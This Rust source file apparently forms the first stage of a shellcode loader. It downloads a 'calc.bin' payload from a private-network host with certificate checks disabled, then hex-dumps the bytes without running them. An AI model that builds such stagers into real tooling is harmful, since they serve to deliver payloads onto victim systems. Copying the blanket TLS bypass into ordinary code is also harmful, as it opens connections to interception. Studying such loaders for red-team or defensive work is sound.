fn download_file(url: &str) -> Result<Vec<u8>, reqwest::Error> {
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .user_agent("Test")
        .default_headers({
            let mut h = reqwest::header::HeaderMap::new();
            h.insert(
                "Accept",
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
                    .parse()
                    .unwrap(),
            );
            h
        })
        .build()?;
    let response = client.get(url).send()?;
    Ok(response.bytes()?.to_vec())
}

fn hex_dump(data: &[u8]) {
    for (i, byte) in data.iter().enumerate() {
        if i % 16 == 0 {
            print!("\n  {:08x}: ", i);
        }
        print!("{:02x} ", byte);
    }
    println!();
}

fn main() {
    let mut shellcode: Vec<u8> = Vec::new();

    let url = "https://192.168.1.34:443/calc.bin"; // Replace with the actual URL
    match download_file(url) {
        Ok(data) => {
            println!("Downloaded {} bytes", data.len());
            shellcode = data;
        }
        Err(e) => {
            eprintln!("Error downloading file: {}", e);
        }
    }

    print!("Downloaded Shellcode:");
    hex_dump(&shellcode);
}
